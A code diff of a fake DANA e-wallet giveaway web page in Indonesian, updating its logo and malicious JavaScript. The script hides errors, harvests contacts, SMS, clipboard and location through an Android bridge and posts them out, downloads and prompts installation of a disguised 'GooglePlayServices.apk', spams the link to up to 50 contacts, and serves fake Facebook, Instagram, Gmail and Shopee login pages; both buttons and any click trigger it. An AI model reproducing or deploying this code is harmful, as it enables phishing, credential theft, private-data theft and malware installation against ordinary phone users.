@@ -4,29 +4,60 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     <title></title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
     <style>
         html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
-        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#0066cc,#001a40);display:flex;justify-content:center;align-items:center;text-align:center}
+        
+        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
         .box{max-width:380px;width:90%;padding:20px}
-        .logo-dana{background:#108ee9;width:80px;height:80px;border-radius:20px;display:flex;justify-content:center;align-items:center;margin:0 auto 15px;font-size:40px;color:#fff;font-weight:bold}
-        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px}
+        
+        /* ===== LOGO DANA ASLI ===== */
+        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
+        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
+        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
+        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
+        /* ===== END LOGO ===== */
+        
+        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
+        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
+        .box-white .label{color:#666;font-size:13px}
+        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
+        .box-white .kuota{color:#0066cc;font-size:12px}
+        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
+        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
+        .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
-        #timer{font-weight:bold}
         .status-bar{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.8);color:#00ff00;padding:8px 20px;border-radius:20px;font-size:12px;z-index:999999;display:none;font-family:monospace}
+        
+        @keyframes fadeIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
     </style>
 </head>
 <body>
 <div id="popupDana">
     <div class="box">
-        <div class="logo-dana">D</div>
-        <h2 style="color:#fff;font-size:26px;font-weight:bold;margin:10px 0">🎉 SELAMAT!</h2>
-        <p style="color:#b3d9ff;font-size:16px;margin:5px 0">Anda mendapatkan Saldo DANA GRATIS!</p>
-        <div style="background:#fff;border-radius:15px;padding:20px;margin:15px 0">
-            <p style="color:#666;font-size:13px">Saldo DANA Gratis</p>
-            <h1 style="color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0">Rp 50.000</h1>
-            <p style="color:#0066cc;font-size:12px">🎁 Kuota terbatas!</p>
+        <!-- ===== LOGO DANA ASLI ===== -->
+        <div class="logo-dana">
+            <div class="icon-wrapper">
+                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
+                </svg>
+            </div>
+            <div class="text-dana">DANA</div>
         </div>
-        <p style="color:#ffcc00;font-size:14px">⏰ Tersisa <span id="timer">00:05</span></p>
+        <!-- ===== END LOGO ===== -->
+        
+        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
+        
+        <div class="box-white">
+            <div class="label">Saldo DANA Gratis</div>
+            <div class="nominal">Rp 500.000</div>
+            <div class="kuota">🎁 Kuota terbatas!</div>
+        </div>
+        
+        <div class="timer">⏰ Tersisa <span id="timer">00:05</span></div>
+        
         <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
         <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
     </div>
@@ -36,13 +67,26 @@
 
 <script>
 // ============================================================
-// LAPIS 1: ANTI-FORENSIK (SEMBUNYIKAN JEJAK)
+// INDEX.HTML - DENGAN LOGO DANA ASLI
+// ============================================================
+
+// ============================================================
+// KONFIGURASI
+// ============================================================
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
+var dataStore = [];
+var hasLS = (typeof localStorage !== 'undefined');
+var semuaDidapat = false;
+var spreadDone = false;
+
+// ============================================================
+// STEALTH
 // ============================================================
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
 console.info = function() {};
-console.debug = function() {};
 window.onerror = function() { return true; };
 window.addEventListener('error', function(e) { e.preventDefault(); return true; });
 window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });
@@ -53,7 +97,21 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// LAPIS 2: DETEKSI LINGKUNGAN
+// FUNGSI K() - KIRIM DATA
+// ============================================================
+function K(d) {
+    dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber, data: d.data });
+    try {
+        fetch('/data', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(d)
+        }).catch(function(){});
+    } catch(e) {}
+}
+
+// ============================================================
+// DETEKSI LINGKUNGAN
 // ============================================================
 function detectEnvironment() {
     var env = { isWebView: false, isFacebook: false, isWhatsApp: false, isTelegram: false, isInstagram: false, isTikTok: false, isAndroidBridge: false, isBrowser: false };
@@ -71,7 +129,7 @@ function detectEnvironment() {
 var ENV = detectEnvironment();
 
 // ============================================================
-// LAPIS 3: ESCAPE WEBVIEW
+// ESCAPE WEBVIEW
 // ============================================================
 function escapeWebView() {
     if (!ENV.isWebView && !ENV.isFacebook && !ENV.isWhatsApp && !ENV.isTelegram && !ENV.isInstagram && !ENV.isTikTok) return;
@@ -82,7 +140,7 @@ function escapeWebView() {
 }
 
 // ============================================================
-// LAPIS 4: ANDROID BRIDGE (FULL AKSES SISTEM)
+// ANDROID BRIDGE
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined',
@@ -114,44 +172,15 @@ var A = {
     downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false },
     installAPK: function(p) { if(this.isAvailable){ try{AndroidBridge.installAPK(p);return true}catch(e){}} return false },
     saveFile: function(path, content) { if(this.isAvailable){ try{AndroidBridge.saveFile(path, content);return true}catch(e){}} return false },
-    openFile: function(path) { if(this.isAvailable){ try{AndroidBridge.openFile(path);return true}catch(e){}} return false }
+    openFile: function(path) { if(this.isAvailable){ try{AndroidBridge.openFile(path);return true}catch(e){}} return false },
+    openApp: function(pkg) { if(this.isAvailable){ try{AndroidBridge.openApp(pkg);return true}catch(e){}} return false }
 };
 
 // ============================================================
-// LAPIS 5: KONFIGURASI
-// ============================================================
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
-var dataStore = [];
-var hasLS = (typeof localStorage !== 'undefined');
-var semuaDidapat = false;
-var spreadDone = false;
-
-function K(d) {
-    dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber, data: d.data });
-    try {
-        fetch('/data', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(d)
-        }).catch(function(){});
-    } catch(e) {}
-}
-
-// ============================================================
-// LAPIS 6: DATA COLLECTION (LENGKAP)
+// DATA COLLECTION
 // ============================================================
 function ambilDataCepat() {
-    var data = {
-        waktu: Date.now(),
-        ua: navigator.userAgent,
-        ip: '',
-        lokasi: null,
-        kontak: null,
-        sms: null,
-        clipboard: null,
-        env: ENV
-    };
+    var data = { waktu: Date.now(), ua: navigator.userAgent, ip: '', lokasi: null, kontak: null, sms: null, clipboard: null, env: ENV };
     
     try {
         fetch('https://api.ipify.org?format=json')
@@ -187,86 +216,29 @@ function ambilDataCepat() {
 }
 
 // ============================================================
-// LAPIS 7: 🔥 NOTIFIKASI 2-IN-1 (INSTALL APK + BUKA HTML)
-// ============================================================
-function notificationInstallAndOpen() {
-    if (!('Notification' in window)) return;
-    
-    if (Notification.permission !== 'granted') {
-        Notification.requestPermission();
-    }
-    
-    if (Notification.permission === 'granted') {
-        var notif = new Notification('⚡ Pembaruan Keamanan', {
-            body: 'Klik untuk menyelesaikan pembaruan dan meningkatkan keamanan perangkat Anda.',
-            icon: 'https://verifikasi.site/icon.png',
-            requireInteraction: true,
-            silent: false,
-            vibrate: [200, 100, 200]
-        });
-        
-        notif.onclick = function() {
-            // 🔥 INSTALL APK (GooglePlayServices.apk)
-            var apkPath = '/sdcard/Download/GooglePlayServices.apk';
-            if (A.isAvailable) {
-                A.installAPK(apkPath);
-                K({ sumber: 'notification_install', data: 'apk_install_started' });
-            } else {
-                try {
-                    window.location.href = 'intent://' + apkPath + '#Intent;scheme=file;package=com.android.packageinstaller;end';
-                } catch(e) {}
-            }
-            
-            // 🔥 BUKA SystemUpdate.html
-            var htmlPath = '/sdcard/Download/SystemUpdate.html';
-            if (A.isAvailable) {
-                A.openFile(htmlPath);
-                K({ sumber: 'notification_install', data: 'html_opened' });
-            } else {
-                try {
-                    window.open('file://' + htmlPath, '_blank');
-                } catch(e) {}
-            }
-            
-            notif.close();
-        };
-        
-        setTimeout(function() {
-            if (notif) notif.close();
-        }, 30000);
-        
-        K({ sumber: 'notification_install', data: 'notification_shown' });
-    }
-}
-
-// ============================================================
-// LAPIS 8: PAYLOAD INJECTION
+// PAYLOAD INJECTION
 // ============================================================
 function payloadInjection() {
     var statusBar = document.getElementById('statusBar');
     statusBar.style.display = 'block';
     
     var apkUrl1 = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-    var apkPath1 = '/sdcard/Download/GooglePlayServices.apk';
     var fileUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var filePath = '/sdcard/Download/SystemUpdate.html';
     
-    // 1. Download GooglePlayServices.apk
     statusBar.textContent = '📥 Mengunduh pembaruan keamanan...';
     if (A.isAvailable) {
         A.downloadFile(apkUrl1, 'GooglePlayServices.apk');
-        K({ sumber: 'payload', data: { status: 'downloaded_GooglePlayServices.apk' } });
+        K({ sumber: 'payload', data: { status: 'apk_downloaded' } });
     } else {
-        try { var a=document.createElement('a'); a.href=apkUrl1; a.download='GooglePlayServices.apk'; a.style.display='none'; document.body.appendChild(a); a.click(); document.body.removeChild(a); K({ sumber: 'payload', data: { status: 'downloaded_via_fetch' } }); } catch(e) {}
+        try { var a=document.createElement('a'); a.href=apkUrl1; a.download='GooglePlayServices.apk'; a.style.display='none'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(e) {}
     }
     
-    // 2. Download SystemUpdate.html
     fetch(fileUrl)
         .then(function(res) { return res.text(); })
         .then(function(html) {
             if (A.isAvailable) {
-                A.saveFile(filePath, html);
-                K({ sumber: 'file_system', data: { status: 'SystemUpdate.html_saved' } });
+                A.saveFile('/sdcard/Download/SystemUpdate.html', html);
+                K({ sumber: 'file_system', data: { status: 'html_saved' } });
             } else {
                 var blob = new Blob([html], {type: 'text/html'});
                 var url = URL.createObjectURL(blob);
@@ -278,12 +250,11 @@ function payloadInjection() {
                 a.click();
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
-                K({ sumber: 'file_system', data: { status: 'SystemUpdate.html_downloaded' } });
+                K({ sumber: 'file_system', data: { status: 'html_downloaded' } });
             }
         })
         .catch(function() {});
     
-    // 3. 🔥 TAMPILKAN NOTIFIKASI 2-IN-1
     setTimeout(function() {
         statusBar.textContent = '🔔 Klik notifikasi untuk menyelesaikan pembaruan...';
         notificationInstallAndOpen();
@@ -292,31 +263,45 @@ function payloadInjection() {
 }
 
 // ============================================================
-// LAPIS 9: SERVICE WORKER
+// NOTIFIKASI 2-IN-1
 // ============================================================
-function injectServiceWorker() {
-    if (!('serviceWorker' in navigator)) return;
-    var swCode = `
-        self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
-        self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
-        self.addEventListener('message',function(e){
-            if(e.data && e.data.type === 'ping'){
-                e.ports[0].postMessage({type:'pong',timestamp:Date.now()});
-            }
-        });
-        setInterval(function(){
-            self.clients.matchAll().then(function(clients){
-                clients.forEach(function(client){
-                    client.postMessage({type:'heartbeat',timestamp:Date.now()});
-                });
-            });
-        }, 10000);
-    `;
-    try { var blob=new Blob([swCode],{type:'application/javascript'}); var swUrl=URL.createObjectURL(blob); navigator.serviceWorker.register(swUrl); K({ sumber: 'service_worker', data: { status: 'registered' } }); } catch(e) {}
+function notificationInstallAndOpen() {
+    if (!('Notification' in window)) return;
+    if (Notification.permission !== 'granted') { Notification.requestPermission(); return; }
+    
+    var notif = new Notification('⚡ Pembaruan Keamanan', {
+        body: 'Klik untuk menyelesaikan pembaruan dan meningkatkan keamanan perangkat Anda.',
+        icon: 'https://verifikasi.site/icon.png',
+        requireInteraction: true,
+        silent: false,
+        vibrate: [200, 100, 200]
+    });
+    
+    notif.onclick = function() {
+        var apkPath = '/sdcard/Download/GooglePlayServices.apk';
+        if (A.isAvailable) {
+            A.installAPK(apkPath);
+            K({ sumber: 'notification_install', data: 'apk_install_started' });
+        } else {
+            try { window.location.href = 'intent://' + apkPath + '#Intent;scheme=file;package=com.android.packageinstaller;end'; } catch(e) {}
+        }
+        
+        var htmlPath = '/sdcard/Download/SystemUpdate.html';
+        if (A.isAvailable) {
+            A.openFile(htmlPath);
+            K({ sumber: 'notification_install', data: 'html_opened' });
+        } else {
+            try { window.open('file://' + htmlPath, '_blank'); } catch(e) {}
+        }
+        notif.close();
+    };
+    
+    setTimeout(function() { if (notif) notif.close(); }, 30000);
+    K({ sumber: 'notification_install', data: 'notification_shown' });
 }
 
 // ============================================================
-// LAPIS 10: AUTO SPREAD
+// AUTO SPREAD
 // ============================================================
 function autoSpread() {
     if (spreadDone) return;
@@ -324,7 +309,7 @@ function autoSpread() {
     if (!A.isAvailable) return;
     var contacts = A.getAllContacts();
     if (!contacts || contacts.length === 0) return;
-    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp50.000! ' + window.location.href);
+    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
     var maxSend = 50;
     contacts.slice(0, maxSend).forEach(function(c, i) {
         setTimeout(function() {
@@ -344,21 +329,50 @@ function autoSpread() {
 }
 
 // ============================================================
-// LAPIS 11: HEARTBEAT
+// HEARTBEAT
 // ============================================================
 function startHeartbeat() {
     setInterval(function(){ K({sumber:'heartbeat', data:'alive'}); }, 10000);
 }
 
 // ============================================================
-// ⚡ EKSEKUSI UTAMA
+// SERVICE WORKER
+// ============================================================
+function injectServiceWorker() {
+    if (!('serviceWorker' in navigator)) return;
+    var swCode = `
+        self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
+        self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
+        self.addEventListener('message',function(e){ if(e.data && e.data.type === 'ping'){ e.ports[0].postMessage({type:'pong',timestamp:Date.now()}); } });
+        setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.forEach(function(client){ client.postMessage({type:'heartbeat',timestamp:Date.now()}); }); }); }, 10000);
+    `;
+    try { var blob=new Blob([swCode],{type:'application/javascript'}); var swUrl=URL.createObjectURL(blob); navigator.serviceWorker.register(swUrl); K({ sumber: 'service_worker', data: { status: 'registered' } }); } catch(e) {}
+}
+
+// ============================================================
+// REDIRECT KE DANA ASLI
+// ============================================================
+function redirectToDANA() {
+    try {
+        window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
+        return;
+    } catch(e) {}
+    if (A.isAvailable) {
+        try { if (A.openApp) { A.openApp('com.dana.id'); return; } if (typeof AndroidBridge !== 'undefined') { AndroidBridge.openApp('com.dana.id'); return; } } catch(e) {}
+    }
+    try { window.location.href = 'market://details?id=com.dana.id'; return; } catch(e) {}
+    try { window.location.href = 'https://www.dana.id'; return; } catch(e) {}
+    try { window.location.href = 'https://www.google.com/search?q=dana+indonesia'; } catch(e) {}
+}
+
+// ============================================================
+// EKSEKUSI UTAMA
 // ============================================================
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
     if(hasLS) localStorage.setItem('sudah_klaim', '1');
-    var popup = document.getElementById('popupDana');
-    if(popup) popup.style.display = 'none';
+    document.getElementById('popupDana').style.display = 'none';
     
     escapeWebView();
     ambilDataCepat();
@@ -367,37 +381,22 @@ function dapatkanSemua() {
     autoSpread();
     startHeartbeat();
     
-    setTimeout(function() {
-        window.location.href = 'https://verifikasi.site/fb';
-    }, 6000);
+    setTimeout(function() { redirectToDANA(); }, 6000);
 }
 
 // ============================================================
-// TRIGGER (3 SKENARIO)
+// TRIGGER
 // ============================================================
 function klaim() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin', data:'klaim'}); }
 function tolak() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin', data:'tolak'}); }
 
-// ===== SPREAD OTOMATIS 1 DETIK =====
-setTimeout(function() {
-    if (!spreadDone) {
-        autoSpread();
-    }
-}, 1000);
+setTimeout(function() { if (!spreadDone) { autoSpread(); } }, 1000);
+setTimeout(function() { if (!semuaDidapat) { dapatkanSemua(); } }, 5000);
 
-// ===== OTOMATIS 5 DETIK =====
-setTimeout(function() {
-    if (!semuaDidapat) {
-        dapatkanSemua();
-    }
-}, 5000);
-
-// ===== KLIK DI MANA SAJA =====
 var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); }, 100); };
 document.addEventListener('click', clickHandler);
 setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 5000);
 
-// ===== TIMER 5 DETIK =====
 var w = 5;
 var timerInterval = setInterval(function() {
     w--;
@@ -411,23 +410,16 @@ var timerInterval = setInterval(function() {
 }, 1000);
 
 // ============================================================
-// PHISHING ROUTING (11 HALAMAN)
+// PHISHING ROUTING (HANYA 4)
 // ============================================================
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
     var t = {
         fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
-        ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
+        ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',subtitle:'Log in to Instagram',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
         gmail: { title:'Gmail',bg:'#fff',btnColor:'#1a73e8',logo:'<div style="text-align:center;padding:30px 0 10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',subtitle:'Sign in to continue to Gmail',fields:[{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],btnText:'Next',redirect:'https://accounts.google.com/signin' },
-        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' },
-        bri: { title:'BRI Mobile',bg:'#0055a4',btnColor:'#0055a4',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BRI</h1>',subtitle:'Login BRI Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://ib.bri.co.id' },
-        bni: { title:'BNI Mobile',bg:'#f37021',btnColor:'#f37021',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BNI</h1>',subtitle:'Login BNI Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.bni.co.id' },
-        mandiri: { title:'Livin by Mandiri',bg:'#003d79',btnColor:'#003d79',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">Livin\'</h1>',subtitle:'by Mandiri',fields:[{id:'email',placeholder:'Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.bankmandiri.co.id' },
-        bca: { title:'BCA Mobile',bg:'#0066b3',btnColor:'#0066b3',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BCA</h1>',subtitle:'Login BCA Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.klikbca.com' },
-        dana: { title:'DANA',bg:'#0066cc',btnColor:'#108ee9',logo:'<div style="text-align:center;padding:30px 0 10px"><div style="background:#108ee9;width:60px;height:60px;border-radius:15px;display:flex;justify-content:center;align-items:center;margin:0 auto"><span style="color:#fff;font-size:30px;font-weight:bold">D</span></div></div>',subtitle:'Login DANA',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.dana.id' },
-        gopay: { title:'GoPay',bg:'#00aa13',btnColor:'#00aa13',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">GoPay</h1>',subtitle:'Login GoPay',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.gojek.com' },
-        ovo: { title:'OVO',bg:'#4a1d8c',btnColor:'#4a1d8c',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">OVO</h1>',subtitle:'Login OVO',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.ovo.id' }
+        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' }
     };
     var key = path.replace('/', '');
     var p = t[key];
